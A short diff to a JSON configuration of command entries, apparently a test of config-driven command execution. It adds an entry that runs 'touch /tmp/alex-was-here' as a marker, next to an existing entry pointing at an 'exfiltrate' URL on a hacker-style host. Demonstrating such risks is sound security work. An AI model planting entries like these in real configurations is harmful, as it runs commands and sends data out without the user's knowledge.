@@ -20,6 +20,12 @@
             "args": [
                 "https://foo.dd.h4x.tv/exfiltrate"
             ]
+        },
+        "touchy": {
+            "command": "touch",
+            "args": [
+                "/tmp/alex-was-here"
+            ]
         }
     }
 }
